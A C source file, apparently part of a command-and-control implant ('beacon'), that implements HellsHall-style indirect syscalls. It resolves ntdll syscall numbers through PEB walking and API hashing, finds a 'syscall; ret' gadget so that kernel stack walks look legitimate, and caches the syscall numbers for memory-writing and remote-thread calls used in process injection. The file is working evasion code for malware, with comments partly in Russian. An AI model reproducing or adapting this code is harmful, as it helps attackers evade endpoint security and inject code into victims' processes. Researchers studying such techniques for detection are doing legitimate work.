// HellsHall indirect syscall implementation.
//
// hh_init() walks ntdll's export table, sorts Nt* syscall stubs by RVA
// (which equals sort-by-SSN on Windows), assigns each function its SSN,
// and finds a "syscall; ret" gadget inside ntdll.  The three globals
// (g_ssn_Nt*, g_hh_gadget) are then read by the thin ASM wrappers in
// syscall_stubs.asm — those wrappers do no arg shifting, so the return
// address visible to a kernel stack walker points into ntdll, not here.
//
// x86/WOW64 build: hh_init() is a no-op; Nt*_i are inline WinAPI wrappers
// defined in beacon.h.  co2h_syscall_ssn / co2h_syscall_gadget return
// sentinel values so callers compile without changes.

#include "../core/beacon.h"

// ---- Globals (SSN кэш для ASM-стабов) -------------------------------------

uint32_t g_ssn_NtAllocateVirtualMemory = 0xFFFFFFFFu;
uint32_t g_ssn_NtProtectVirtualMemory  = 0xFFFFFFFFu;
uint32_t g_ssn_NtFreeVirtualMemory     = 0xFFFFFFFFu;
uint32_t g_ssn_NtOpenProcess           = 0xFFFFFFFFu;
uint32_t g_ssn_NtWriteVirtualMemory    = 0xFFFFFFFFu;
uint32_t g_ssn_NtReadVirtualMemory     = 0xFFFFFFFFu;
uint32_t g_ssn_NtCreateThreadEx        = 0xFFFFFFFFu;

// gadget-адрес нужен только на x64 (ASM-стаб делает jmp r11 → gadget)
#ifdef _WIN64
void*    g_hh_gadget = NULL;
#endif

// ---- Internal SSN table (always-present, empty on x86) --------------------

#define HH_MAX 512

typedef struct { uint32_t hash; uint32_t rva; } HhRaw;
typedef struct { uint32_t hash; uint32_t ssn; } HhEntry;

static HhEntry  g_hh_tbl[HH_MAX];
static uint32_t g_hh_cnt   = 0;
static int      g_hh_ready = 0;

// ---- x64-only: сбор SSN и поиск gadget ------------------------------------

#ifdef _WIN64

// Сортировка по RVA (без CRT).
static void hh_sort(HhRaw* a, uint32_t n) {
    for (uint32_t i = 1; i < n; ++i) {
        HhRaw k = a[i];
        uint32_t j = i;
        while (j && a[j-1].rva > k.rva) { a[j] = a[j-1]; --j; }
        a[j] = k;
    }
}

// Обход экспортов ntdll: паттерн x64 stub = 4C 8B D1 B8 (mov r10,rcx; mov eax,SSN).
static void hh_collect(void) {
    uint8_t* base = (uint8_t*)peb_find_module(api_hash_w(L"ntdll.dll"));
    if (!base) return;

    IMAGE_DOS_HEADER*    dos = (IMAGE_DOS_HEADER*)base;
    IMAGE_NT_HEADERS*    nt  = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    DWORD exp_rva = nt->OptionalHeader
                      .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
                      .VirtualAddress;
    if (!exp_rva) return;

    IMAGE_EXPORT_DIRECTORY* exp   = (IMAGE_EXPORT_DIRECTORY*)(base + exp_rva);
    DWORD* names  = (DWORD*)(base + exp->AddressOfNames);
    WORD*  ords   = (WORD*) (base + exp->AddressOfNameOrdinals);
    DWORD* funcs  = (DWORD*)(base + exp->AddressOfFunctions);

    HhRaw* raw = (HhRaw*)bmalloc(HH_MAX * sizeof(HhRaw));
    if (!raw) return;
    uint32_t n = 0;

    for (DWORD i = 0; i < exp->NumberOfNames && n < HH_MAX; ++i) {
        const char* name = (const char*)(base + names[i]);
        if (name[0] != 'N' || name[1] != 't' ||
            name[2] < 'A'  || name[2] > 'Z') continue;
        uint32_t rva = funcs[ords[i]];
        const uint8_t* fn = base + rva;
        if (fn[0] != 0x4C || fn[1] != 0x8B ||
            fn[2] != 0xD1 || fn[3] != 0xB8) continue;
        raw[n].hash = api_hash(name);
        raw[n].rva  = rva;
        ++n;
    }

    hh_sort(raw, n);

    for (uint32_t i = 0; i < n; ++i) {
        g_hh_tbl[i].hash = raw[i].hash;
        g_hh_tbl[i].ssn  = i;
    }
    g_hh_cnt = n;
    bfree(raw);
}

// Поиск "syscall; ret" (0F 05 C3) в секциях кода ntdll.
static void hh_find_gadget(void) {
    uint8_t* base = (uint8_t*)peb_find_module(api_hash_w(L"ntdll.dll"));
    if (!base) return;
    IMAGE_NT_HEADERS*     nt  = (IMAGE_NT_HEADERS*)
                                (base + ((IMAGE_DOS_HEADER*)base)->e_lfanew);
    IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i, ++sec) {
        if (!(sec->Characteristics & IMAGE_SCN_CNT_CODE)) continue;
        uint8_t* p    = base + sec->VirtualAddress;
        DWORD    size = sec->Misc.VirtualSize;
        for (DWORD j = 0; j + 2 < size; ++j) {
            if (p[j] == 0x0F && p[j+1] == 0x05 && p[j+2] == 0xC3) {
                g_hh_gadget = p + j;
                return;
            }
        }
    }
}

#endif /* _WIN64 */

// ---- Public init -----------------------------------------------------------

void hh_init(void) {
#ifdef _WIN64
    if (g_hh_ready) return;
    hh_collect();
    hh_find_gadget();

    uint32_t h_alloc  = api_hash("NtAllocateVirtualMemory");
    uint32_t h_prot   = api_hash("NtProtectVirtualMemory");
    uint32_t h_free   = api_hash("NtFreeVirtualMemory");
    uint32_t h_open   = api_hash("NtOpenProcess");
    uint32_t h_writev = api_hash("NtWriteVirtualMemory");
    uint32_t h_readv  = api_hash("NtReadVirtualMemory");
    uint32_t h_crtex  = api_hash("NtCreateThreadEx");

    for (uint32_t i = 0; i < g_hh_cnt; ++i) {
        uint32_t h = g_hh_tbl[i].hash;
        if      (h == h_alloc)  g_ssn_NtAllocateVirtualMemory = g_hh_tbl[i].ssn;
        else if (h == h_prot)   g_ssn_NtProtectVirtualMemory  = g_hh_tbl[i].ssn;
        else if (h == h_free)   g_ssn_NtFreeVirtualMemory     = g_hh_tbl[i].ssn;
        else if (h == h_open)   g_ssn_NtOpenProcess           = g_hh_tbl[i].ssn;
        else if (h == h_writev) g_ssn_NtWriteVirtualMemory    = g_hh_tbl[i].ssn;
        else if (h == h_readv)  g_ssn_NtReadVirtualMemory     = g_hh_tbl[i].ssn;
        else if (h == h_crtex)  g_ssn_NtCreateThreadEx        = g_hh_tbl[i].ssn;
    }
    g_hh_ready = 1;
#endif
    // x86: no-op — Nt*_i — это inline-обёртки над VirtualAllocEx/ProtectEx/FreeEx.
}

// ---- Generic hash-based API (used by co2h_do_syscall) ----------------------

uint32_t co2h_syscall_ssn(uint32_t hash) {
    if (!g_hh_ready) hh_init();
    for (uint32_t i = 0; i < g_hh_cnt; ++i)
        if (g_hh_tbl[i].hash == hash) return g_hh_tbl[i].ssn;
    return 0xFFFFFFFFu;
}

void* co2h_syscall_gadget(uint32_t hash) {
    (void)hash;
#ifdef _WIN64
    if (!g_hh_ready) hh_init();
    return g_hh_gadget;
#else
    return NULL;
#endif
}
